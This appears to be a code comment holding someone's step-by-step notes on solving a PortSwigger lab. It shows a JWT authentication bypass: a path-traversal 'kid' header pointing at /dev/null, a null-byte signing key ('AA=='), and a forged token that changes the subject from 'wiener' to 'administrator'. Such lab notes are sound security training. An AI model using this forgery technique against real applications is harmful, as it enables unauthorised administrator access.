/*

1) kid param in jwk set, arbitrary file from FS as verification key

2) set it to /dev/null or a base64 null byte using jwt editor

3) the jwt captured:

{
    "kid": "3abc62bc-0e3f-4968-8659-56dc79cb9d30",
    "alg": "HS256"
}
{
    "iss": "portswigger",
    "sub": "wiener",
    "exp": 1695450013
}

4) modify, any number of path backwards wont affect as 
    there is nothing further back than the root directory

{
    "kid": "../../../../../../../../dev/null",
    "alg": "HS256"
}
{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1695450013
}

5) generate a symmetric signing key with kid parameter empty, and replace the
    k with 'AA==' which is null byte representation in base64

6) before sending the modified jwt, sign it with the generated key which has 
    empty string as kid, 

    7) send

*/